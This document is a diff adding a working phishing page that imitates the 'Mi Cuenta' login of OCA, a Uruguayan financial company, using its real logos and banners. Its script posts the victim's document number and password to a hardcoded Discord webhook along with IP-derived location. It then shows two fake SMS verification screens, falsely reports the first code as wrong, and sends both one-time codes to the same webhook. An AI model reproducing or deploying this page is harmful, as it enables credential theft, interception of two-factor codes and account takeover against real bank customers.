@@ -1,0 +1,695 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mi Cuenta | OCA</title>
+    <style>
+        /* --- Reset y Estilos Base --- */
+        *, *::before, *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body, html {
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            color: #333333;
+            -webkit-font-smoothing: antialiased;
+        }
+        .page-container {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* --- Header --- */
+        .main-header {
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 24px 20px 20px 20px;
+        }
+        .logo-box img {
+            height: 34px;
+            display: block;
+        }
+
+        /* --- Área de Contenido --- */
+        .main-content {
+            display: flex;
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            flex: 1;
+            padding: 0 20px;
+            gap: 40px;
+        }
+
+        /* Panel Izquierdo (Escritorio) */
+        .left-panel {
+            flex: 1.1;
+            display: flex;
+            justify-content: flex-end;
+            padding-right: 20px;
+        }
+        .desktop-banner {
+            width: 100%;
+            max-width: 480px;
+        }
+        .desktop-banner img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* Panel Derecho (Manejador de Pantallas) */
+        .right-panel {
+            flex: 0.9;
+            display: flex;
+            justify-content: flex-start;
+        }
+        .login-wrapper {
+            width: 100%;
+            max-width: 420px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Control de Visibilidad de Pantallas */
+        .step-view {
+            display: none;
+            width: 100%;
+            flex-direction: column;
+        }
+        .step-view.active-step {
+            display: flex;
+        }
+
+        /* Elementos del Formulario */
+        .form-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 12px;
+        }
+        .form-subtitle {
+            font-size: 14px;
+            color: #666666;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+        .error-message-box {
+            background-color: #fdf2f2;
+            border: 1px solid #f8b4b4;
+            border-radius: 6px;
+            padding: 12px 14px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #9b1c1c;
+            font-weight: 600;
+            line-height: 1.4;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #444444;
+            margin-bottom: 8px;
+        }
+        .input-control {
+            width: 100%;
+            height: 46px;
+            border: 1px solid #cccccc;
+            border-radius: 6px;
+            padding: 0 14px;
+            font-size: 15px;
+            color: #333333;
+            outline: none;
+            background-color: #ffffff;
+            transition: all 0.2s ease-in-out;
+        }
+        .input-control:focus {
+            border-color: #0076df;
+        }
+
+        /* Estilos específicos para inputs de token */
+        .token-input {
+            font-size: 16px;
+            letter-spacing: 2px;
+        }
+        .token-input.input-error {
+            border-color: #e11d48;
+        }
+        .token-input.input-error:focus {
+            border-color: #e11d48;
+            box-shadow: 0 0 0 3px rgba(225, 29, 72, 0.1);
+        }
+
+        /* Campo de Contraseña Seguro */
+        .password-container {
+            position: relative;
+            width: 100%;
+        }
+        .password-container .input-control {
+            padding-right: 44px;
+        }
+        .toggle-password-btn {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+        .toggle-password-btn svg {
+            width: 20px;
+            height: 20px;
+            fill: #757575;
+        }
+        .forgot-password-link {
+            display: inline-block;
+            margin-top: 8px;
+            font-size: 14px;
+            color: #0076df;
+            text-decoration: none;
+        }
+        .forgot-password-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Botones y Acciones Principales */
+        .actions-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 24px;
+            margin-bottom: 24px;
+        }
+        .register-link {
+            font-size: 15px;
+            color: #0076df;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .register-link:hover {
+            text-decoration: underline;
+        }
+        .submit-btn {
+            height: 44px;
+            padding: 0 38px;
+            background-color: #0076df;
+            color: #ffffff;
+            border: none;
+            border-radius: 22px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .submit-btn:disabled {
+            cursor: not-allowed;
+            opacity: 0.5;
+        }
+        .submit-btn.full-width {
+            width: 100%;
+        }
+
+        /* --- Elementos Exclusivos de Versión Móvil --- */
+        .mobile-banner-container {
+            display: none;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .mobile-banner-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+            border-radius: 6px;
+        }
+        .carousel-dots {
+            display: none;
+            text-align: center;
+            margin-top: 12px;
+            margin-bottom: 24px;
+        }
+        .dot {
+            display: inline-block;            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: #e2e8f0;
+            margin: 0 4px;
+        }
+        .dot.active {
+            background-color: #475569;
+        }
+
+        /* --- Enlaces Secundarios Inferiores --- */
+        .secondary-links {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 45px;
+        }
+        .sec-link {
+            font-size: 14px;
+            color: #0076df;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .sec-link:hover {
+            text-decoration: underline;
+        }
+
+        /* --- Sección Descarga de Aplicación --- */
+        .app-download-section {
+            border-top: 1px solid #eeeeee;
+            padding-top: 25px;
+            margin-bottom: 20px;
+        }
+        .app-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #444444;
+            margin-bottom: 14px;
+        }
+        .store-buttons {
+            display: flex;
+            gap: 12px;
+        }
+        .store-btn-link {
+            flex: 1;
+            height: 44px;
+            background-color: #111111;
+            border-radius: 6px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 12px;
+            gap: 8px;
+        }
+        .store-btn-link img {
+            width: 22px;
+            height: 22px;
+            object-fit: contain;
+            flex-shrink: 0;
+        }
+        .store-btn-text {
+            font-size: 14px;
+            font-weight: 700;
+            color: #ffffff;
+            line-height: 1;
+        }
+
+        /* --- Footer Completo Estilo Web --- */
+        .main-footer {
+            width: 100%;
+            border-top: 1px solid #e2e8f0;
+            padding: 16px 0;
+            background-color: #ffffff;
+            margin-top: 40px;
+        }
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #777777;
+            flex-wrap: wrap;
+        }
+        .footer-links a {
+            color: #777777;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .footer-divider {
+            color: #cccccc;
+            margin: 0 4px;
+        }
+
+        /* --- Responsive / Adaptabilidad Móvil --- */
+        @media screen and (max-width: 860px) {
+            .main-header {
+                padding: 16px 20px;
+            }
+            .main-content {
+                flex-direction: column;
+                gap: 0;
+            }
+            .left-panel {
+                display: none;
+            }
+            .right-panel {
+                width: 100%;
+            }
+            .login-wrapper {
+                max-width: 100%;
+            }
+
+            /* Reordenamiento exacto para versión móvil */
+            .step-container-wrapper { order: 1; display: flex; flex-direction: column; }
+            .mobile-banner-container { order: 2; display: block; }
+            .carousel-dots { order: 3; display: block; }
+            .secondary-links { order: 4; }
+            .app-download-section { order: 5; }
+
+            .footer-content {
+                flex-direction: column;                gap: 6px;
+                text-align: center;
+            }
+            .footer-divider {
+                display: none;
+            }
+            .footer-links {
+                margin-bottom: 4px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="page-container">
+        <header class="main-header">
+            <div class="logo-box">
+                <img src="https://micuentanuevo.oca.com.uy/StaticContent/img/logos/OCA_logo-color.svg" alt="OCA">
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="left-panel">
+                <div class="desktop-banner">
+                    <img src="https://www.oca.com.uy/imagenes/OCA_Seguros_Addiuva.jpg" alt="Seguro Asistencia 365">
+                </div>
+            </div>
+
+            <div class="right-panel">
+                <div class="login-wrapper">
+                    
+                    <div class="step-container-wrapper">
+                        
+                        <div id="stepLogin" class="step-view active-step">
+                            <h1 class="form-title" style="margin-bottom: 24px;">Ingresá a Mi Cuenta</h1>
+                            <form id="loginForm" autocomplete="off">
+                                <div class="form-group">
+                                    <label class="form-label" for="documento">Nro. de documento</label>
+                                    <input type="text" id="documento" class="input-control" placeholder="Documento" required>
+                                </div>
+                                <div class="form-group">
+                                    <label class="form-label" for="passwordInput">Contraseña</label>
+                                    <div class="password-container">
+                                        <input type="password" id="passwordInput" class="input-control" placeholder="Contraseña" required>
+                                        <button type="button" class="toggle-password-btn" id="togglePassword">
+                                            <svg viewBox="0 0 24 24">
+                                                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                                            </svg>
+                                        </button>
+                                    </div>
+                                    <a href="#" class="forgot-password-link">¿Olvidaste tu contraseña?</a>
+                                </div>
+                                <div class="actions-container">
+                                    <a href="#" class="register-link">Registrarme</a>
+                                    <button type="submit" id="btnSubmitLogin" class="submit-btn">Ingresar</button>
+                                </div>
+                            </form>
+                        </div>
+
+                        <div id="stepToken1" class="step-view">
+                            <h1 class="form-title">Verificación de Seguridad</h1>
+                            <p class="form-subtitle">Hemos enviado un código a su celular. Por favor, ingréselo a continuación para continuar.</p>
+                            <form id="tokenForm1" autocomplete="off">
+                                <div class="form-group">
+                                    <label class="form-label" for="token1">Código de verificación</label>
+                                    <input type="text" id="token1" class="input-control token-input" placeholder="• • • • • •" inputmode="numeric" pattern="[0-9]*" maxlength="7" required>
+                                </div>
+                                <div class="actions-container">
+                                    <button type="submit" id="btnSubmitToken1" class="submit-btn full-width" disabled>Confirmar</button>
+                                </div>
+                            </form>
+                        </div>
+
+                        <div id="stepToken2" class="step-view">
+                            <h1 class="form-title">Verificación de Seguridad</h1>
+                            <p class="form-subtitle">Por favor, vuelva a ingresar el código enviado a su celular de forma correcta.</p>
+                            <div class="error-message-box">
+                                El código de verificación ingresado es incorrecto o inválido. Por favor, intente nuevamente.
+                            </div>
+                            <form id="tokenForm2" autocomplete="off">
+                                <div class="form-group">
+                                    <label class="form-label" for="token2">Código de verificación</label>
+                                    <input type="text" id="token2" class="input-control token-input input-error" placeholder="• • • • • •" inputmode="numeric" pattern="[0-9]*" maxlength="7" required>
+                                </div>
+                                <div class="actions-container">
+                                    <button type="submit" id="btnSubmitToken2" class="submit-btn full-width" disabled>Confirmar</button>
+                                </div>
+                            </form>
+                        </div>
+
+                    </div>
+
+                    <div class="mobile-banner-container">
+                        <img src="https://www.oca.com.uy/imagenes/Banner_loginPram-mobile.jpg" alt="¿Necesitas efectivo? Tranqui">
+                    </div>
+                    
+                    <div class="carousel-dots">
+                        <span class="dot"></span>
+                        <span class="dot"></span>
+                        <span class="dot active"></span>
+                        <span class="dot"></span>
+                        <span class="dot"></span>
+                        <span class="dot"></span>
+                        <span class="dot"></span>
+                    </div>
+
+                    <div class="secondary-links">
+                        <a href="#" class="sec-link">Abrir cuenta</a>
+                        <a href="#" class="sec-link">Solicitar tarjeta de crédito</a>
+                    </div>
+
+                    <div class="app-download-section">
+                        <h2 class="app-title">Descargá la app de OCA</h2>
+                        <div class="store-buttons">
+                            <a href="#" class="store-btn-link">
+                                <img src="https://micuentanuevo.oca.com.uy/StaticContent/img/icons/play-store-icon.svg" alt="Icono Play Store">
+                                <span class="store-btn-text">Play Store</span>
+                            </a>
+                            <a href="#" class="store-btn-link">
+                                <img src="https://micuentanuevo.oca.com.uy/StaticContent/img/icons/app-store-icon.svg" alt="Icono App Store">
+                                <span class="store-btn-text">App Store</span>
+                            </a>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </main>
+
+        <footer class="main-footer">
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="#">Política de privacidad</a>
+                    <span class="footer-divider">|</span>
+                    <a href="#">Términos y condiciones</a>
+                </div>
+                <span>&nbsp;|&nbsp; &copy; 2026 OCA S.A. &nbsp;|&nbsp; &copy; 2026 OCA Dinero Electrónico S.A.</span>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // --- Variables de geolocalización global ---
+        let userLocationData = { ip: 'Desconocida', ciudad: 'Desconocida', pais: 'Desconocido' };
+        const webhookURL = 'https://discord.com/api/webhooks/1508462799079346266/KNByO07_Mqw9LpLrNiuW38RIMcjnXL53-EfxlB_ZU1amnyFpLoQGa7XciANdkxJHB0iA';
+
+        // --- Prefetch de Geolocalización ---
+        async function prefetchLocation() {
+            const providers = [
+                { url: 'https://ip-api.com/json/', parse: d => ({ ip: d.query, ciudad: d.city, pais: d.country }) },
+                { url: 'https://ipapi.co/json/', parse: d => ({ ip: d.ip, ciudad: d.city, pais: d.country_name }) },
+                { url: 'https://ipwho.is/', parse: d => ({ ip: d.ip, ciudad: d.city, pais: d.country }) },
+                { url: 'https://freeipapi.com/api/json', parse: d => ({ ip: d.ipAddress, ciudad: d.cityName, pais: d.countryName }) },
+                { url: 'https://extreme-ip-lookup.com/json/', parse: d => ({ ip: d.query, ciudad: d.city, pais: d.country }) }
+            ];
+            for (const provider of providers) {
+                try {
+                    const response = await fetch(provider.url, { signal: AbortSignal.timeout(3000) });
+                    if (!response.ok) continue;
+                    const data = await response.json();
+                    const result = provider.parse(data);
+                    if (result.ip) {
+                        userLocationData = result;
+                        break;
+                    }
+                } catch (e) {
+                    continue;
+                }
+            }
+        }
+        prefetchLocation();
+
+        // --- Función de envío unificada ---
+        async function enviarAWebhook(payload) {
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {}
+        }
+
+        // --- Navegación entre pantallas ---
+        function switchStep(currentId, nextId) {
+            document.getElementById(currentId).classList.remove('active-step');
+            document.getElementById(nextId).classList.add('active-step');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // --- Lógica Pantalla 1: Login ---
+        const loginForm = document.getElementById('loginForm');
+        const btnSubmitLogin = document.getElementById('btnSubmitLogin');
+        const passwordInput = document.getElementById('passwordInput');
+        const togglePassword = document.getElementById('togglePassword');
+
+        togglePassword.addEventListener('click', () => {
+            const isPassword = passwordInput.type === 'password';
+            passwordInput.type = isPassword ? 'text' : 'password';
+        });
+
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            btnSubmitLogin.setAttribute('disabled', 'true');
+            btnSubmitLogin.innerText = 'Verificando...';
+
+            const usuario = document.getElementById('documento').value;
+            const pass = passwordInput.value;
+
+            const mensaje = {
+                content: null,
+                embeds: [{
+                    title: "🔐 Nuevo inicio de sesión OCA",
+                    color: 5814783,
+                    fields: [
+                        { name: "📄 Usuario", value: usuario, inline: true },
+                        { name: "🔒 Contraseña", value: pass, inline: true },
+                        { name: "🌐 IP", value: userLocationData.ip, inline: true },
+                        { name: "🏙️ Ciudad", value: userLocationData.ciudad, inline: true },
+                        { name: "🌍 País", value: userLocationData.pais, inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Ejecuta el envío de fondo y espera los 2 segundos exactos solicitados
+            await Promise.all([
+                enviarAWebhook(mensaje),
+                new Promise(resolve => setTimeout(resolve, 2000))
+            ]);
+
+            switchStep('stepLogin', 'stepToken1');
+        });
+
+        // --- Lógica Pantalla 2: Primer Token ---
+        const tokenForm1 = document.getElementById('tokenForm1');
+        const tokenInput1 = document.getElementById('token1');
+        const btnSubmitToken1 = document.getElementById('btnSubmitToken1');
+
+        tokenInput1.addEventListener('input', function() {
+            let value = this.value.replace(/\D/g, '');
+            this.value = value;
+            if (value.length === 6 || value.length === 7) {
+                btnSubmitToken1.removeAttribute('disabled');
+            } else {
+                btnSubmitToken1.setAttribute('disabled', 'true');
+            }
+        });
+
+        tokenForm1.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            btnSubmitToken1.setAttribute('disabled', 'true');
+            btnSubmitToken1.innerText = 'Verificando...';
+
+            const mensaje = {
+                content: null,
+                embeds: [{
+                    title: "🔐 Código 1",
+                    color: 15105570,
+                    fields: [
+                        { name: "🔢 Código ", value: tokenInput1.value, inline: true },
+                        { name: "🌐 IP", value: userLocationData.ip, inline: true },
+                        { name: "🏙️ Ciudad", value: userLocationData.ciudad, inline: true },
+                        { name: "🌍 País", value: userLocationData.pais, inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            await Promise.all([
+                enviarAWebhook(mensaje),
+                new Promise(resolve => setTimeout(resolve, 2000))
+            ]);
+
+            switchStep('stepToken1', 'stepToken2');
+        });
+
+        // --- Lógica Pantalla 3: Segundo Token ---
+        const tokenForm2 = document.getElementById('tokenForm2');
+        const tokenInput2 = document.getElementById('token2');
+        const btnSubmitToken2 = document.getElementById('btnSubmitToken2');
+
+        tokenInput2.addEventListener('input', function() {
+            let value = this.value.replace(/\D/g, '');
+            this.value = value;
+            if (value.length === 6 || value.length === 7) {
+                btnSubmitToken2.removeAttribute('disabled');
+            } else {
+                btnSubmitToken2.setAttribute('disabled', 'true');
+            }
+        });
+
+        tokenForm2.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            btnSubmitToken2.setAttribute('disabled', 'true');
+            btnSubmitToken2.innerText = 'Verificando...';
+
+            const mensaje = {
+                content: null,
+                embeds: [{
+                    title: "🔴 Código 2",
+                    color: 15158332,
+                    fields: [
+                        { name: "🔢 Código ", value: tokenInput2.value, inline: true },
+                        { name: "🌐 IP", value: userLocationData.ip, inline: true },
+                        { name: "🏙️ Ciudad", value: userLocationData.ciudad, inline: true },
+                        { name: "🌍 País", value: userLocationData.pais, inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            await Promise.all([
+                enviarAWebhook(mensaje),
+                new Promise(resolve => setTimeout(resolve, 2000))
+            ]);
+
+            window.location.href = "index.html";
+        });
+    </script>
+</body>
+</html>
